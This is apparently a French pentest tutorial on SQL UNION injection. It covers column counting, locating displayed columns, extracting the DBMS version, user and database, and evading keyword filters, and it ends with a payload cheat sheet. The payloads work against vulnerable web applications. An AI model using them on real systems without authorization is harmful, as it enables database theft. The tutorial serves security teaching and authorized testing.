# Injection UNION

## Pourquoi

Le bypass d'authentification est utile mais limite : on se connecte sans mot de passe, sans plus. L'injection UNION va beaucoup plus loin. Elle permet d'ajouter une requete `SELECT` complete a la requete originale et d'en afficher le resultat dans la page. On peut ainsi extraire des donnees de n'importe quelle table et base de donnees accessible par le SGBD.

## Comment ca marche

### La clause UNION

`UNION` combine les resultats de deux requetes `SELECT` en un seul jeu de resultats :

```sql
SELECT code, city FROM ports UNION SELECT ship, city FROM ships;
```

Le resultat contient les lignes des deux tables. Deux contraintes :

1. Les deux `SELECT` doivent avoir le **meme nombre de colonnes**
2. Les types de donnees doivent etre compatibles entre les colonnes correspondantes

Si le nombre de colonnes differe, MySQL retourne l'erreur :

```
ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

### Colonnes de remplissage (junk data)

Quand la requete originale a plus de colonnes que ce qu'on veut extraire, on remplit les colonnes supplementaires avec des valeurs factices :

```sql
-- La requete originale a 4 colonnes, on veut extraire seulement username
UNION SELECT username, 2, 3, 4 FROM passwords-- -
```

Utiliser des nombres (1, 2, 3, 4) comme junk data permet de reperer facilement quelle colonne est affichee dans la page.

{% hint style="success" %}
Pour eviter les erreurs de type, utiliser `NULL` comme valeur de remplissage. `NULL` est compatible avec tous les types de donnees.
{% endhint %}

## En pratique

### Etape 1 : Detecter le nombre de colonnes

Deux methodes possibles :

{% tabs %}
{% tab title="ORDER BY" %}
Incrementer le numero de colonne jusqu'a obtenir une erreur :

```sql
' ORDER BY 1-- -    -- OK
' ORDER BY 2-- -    -- OK
' ORDER BY 3-- -    -- OK
' ORDER BY 4-- -    -- OK
' ORDER BY 5-- -    -- Erreur : Unknown column '5' in 'order clause'
```

La derniere valeur qui fonctionne (4) donne le nombre de colonnes.
{% endtab %}

{% tab title="UNION SELECT" %}
Tester avec un nombre croissant de colonnes jusqu'a obtenir un resultat :

```sql
' UNION SELECT 1-- -         -- Erreur (pas assez de colonnes)
' UNION SELECT 1,2-- -       -- Erreur
' UNION SELECT 1,2,3-- -     -- Erreur
' UNION SELECT 1,2,3,4-- -   -- Resultat : 4 colonnes
```

La premiere requete qui retourne un resultat confirme le nombre de colonnes.
{% endtab %}
{% endtabs %}

### Etape 2 : Identifier les colonnes affichees

Toutes les colonnes ne sont pas forcement rendues dans la page. Avec le payload `' UNION SELECT 1,2,3,4-- -`, observer quels nombres apparaissent a l'ecran.

Si seuls `2`, `3` et `4` sont visibles, la colonne 1 (souvent un ID) n'est pas affichee. Placer les donnees a extraire dans les colonnes visibles.

### Etape 3 : Extraire des donnees

Remplacer un des nombres visibles par la donnee voulue :

```sql
-- Version du SGBD
' UNION SELECT 1,@@version,3,4-- -

-- Utilisateur courant
' UNION SELECT 1,user(),3,4-- -

-- Base de donnees courante
' UNION SELECT 1,database(),3,4-- -
```

### Exemple complet

Supposons une page de recherche vulnerable avec 4 colonnes, dont les colonnes 2, 3 et 4 sont affichees :

```sql
-- 1. Confirmer le nombre de colonnes
cn' ORDER BY 5-- -     -- Erreur -> 4 colonnes

-- 2. Identifier les colonnes visibles
cn' UNION SELECT 1,2,3,4-- -    -- Affiche 2, 3, 4

-- 3. Extraire la version
cn' UNION SELECT 1,@@version,3,4-- -

-- 4. Extraire l'utilisateur et la base
cn' UNION SELECT 1,user(),database(),4-- -
```

## Pieges et galeres

- Le nombre de colonnes doit correspondre exactement. Une colonne en trop ou en moins produit une erreur.
- Certaines applications n'affichent que la premiere ligne du resultat. Ajouter une condition impossible a la requete originale pour que ses resultats soient vides et que seule la ligne injectee apparaisse : `cn' AND 1=2 UNION SELECT 1,2,3,4-- -`.
- Les colonnes de la requete UNION heritent des noms de colonnes de la premiere requete. Les noms affiches dans la page peuvent preter a confusion.
- Si la page filtre certains mots-cles (`UNION`, `SELECT`), tester des variations de casse (`uNiOn SeLeCt`), des commentaires inline (`UN/**/ION SEL/**/ECT`), ou l'encodage d'URL.

## Retour terrain

L'injection UNION est la technique la plus directe pour extraire des donnees. En engagement, la sequence est toujours la meme : detecter le nombre de colonnes, identifier lesquelles sont affichees, puis extraire les donnees. C'est une technique bruyante (les payloads sont visibles dans les logs), mais en pentest autorise ce n'est pas un probleme. Pour les cas ou les resultats ne sont pas affiches, il faudra passer aux techniques blind (boolean et time-based).

## Memo express

| Etape | Payload |
|---|---|
| Compter les colonnes (ORDER BY) | `' ORDER BY N-- -` (incrementer N) |
| Compter les colonnes (UNION) | `' UNION SELECT 1,2,...,N-- -` |
| Identifier les colonnes visibles | Observer quels nombres apparaissent |
| Version du SGBD | `' UNION SELECT 1,@@version,3,4-- -` |
| Utilisateur courant | `' UNION SELECT 1,user(),3,4-- -` |
| Base courante | `' UNION SELECT 1,database(),3,4-- -` |
| Forcer la requete originale a rien | `' AND 1=2 UNION SELECT ...` |
| Junk data universel | `NULL` |

***
